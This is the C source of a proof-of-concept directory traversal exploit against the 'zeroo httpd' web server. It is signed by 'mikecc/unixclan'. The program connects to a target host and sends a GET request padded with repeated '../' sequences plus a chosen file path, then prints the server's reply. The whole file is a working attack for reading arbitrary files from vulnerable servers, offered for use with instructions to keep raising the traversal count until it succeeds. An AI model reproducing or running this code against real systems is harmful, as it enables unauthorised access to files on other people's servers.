/*
 * zeroo httpd remote directory traversal exploit
 * proof of concept
 *      hehe, just a copy and paste from my other directory
 *      traversal exploit ;p
 * [mikecc] [http://uc.zemos.net/]
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <unistd.h>

#define FOO "../"

void get(int sd);

int main(int argc, char **argv)
{
        struct sockaddr_in sock;
        struct hostent *pHe;
        int sd;
        int amt;
        char * host;
        char * file;
        short port;
        char expstr[1024];
        int x;
        char * baz;

        printf("UC-zeroo\n");
        printf("zeroo httpd remote exploit\n");
        printf("[mikecc/unixclan] [http://uc.zemos.net/]\n\n");
        if (argc != 5)
        {
                printf("%s host port file traverse_amount (>= 1 [keep incrementing till hit])\n",argv[0]);
                return 0;
        }
        host = argv[1];
        port = atoi(argv[2]);
        file = argv[3];
	        amt = atoi(argv[4]);
        if ((pHe = gethostbyname(host)) == NULL)
        {
                printf("Host lookup error.\n");
                return 0;
        }
        if ((sd = socket(AF_INET,SOCK_STREAM,0)) == -1)
        {
                printf("sock() failed.\n");
                return 0;
        }
        sock.sin_family = AF_INET;
        sock.sin_port = htons(port);
        memcpy(&sock.sin_addr.s_addr,pHe->h_addr,pHe->h_length);
        printf("Connecting...\n");
        if ((connect(sd,(struct sockaddr *)&sock,sizeof(sock))) == -1)
        {
                printf("Failed to connect to %s.\n",host);
                return 0;
        }
        printf("Setting up exploit string..\n");
        if ((amt + 8 + strlen(file)) > 1024)
        {
                printf("Error. Limit 1024 characters.\n");
                return 0;
        }
        sprintf(expstr,"GET /");
        for (x = 0; x < amt; x++)
        {
                strcat(expstr,FOO);
        }
        printf("\tInserting file string..\n");
        strcat(expstr,file);
        strcat(expstr,"\n\n");
        printf("Sending exploit string...\n");
        write(sd,expstr,strlen(expstr));
        get(sd);
        close(sd);
        return 0;
}

void get(int sd)
{
        char buf[1024];
        int x;
        fd_set rset;

        FD_ZERO(&rset);
        while (1)
        {
                FD_SET(sd,&rset);
                select(sd+1,&rset,0,0,0);
                if (FD_ISSET(sd,&rset))
                {
                        if ((x = read(sd,buf,1024)) == 0)
                        {
                                printf("Connection closed by foreign host.\n");
                                exit(1);
                        }
                        buf[x] = 0; /* clean out junk */
                        printf("%s\n",buf);
                }
        }
}

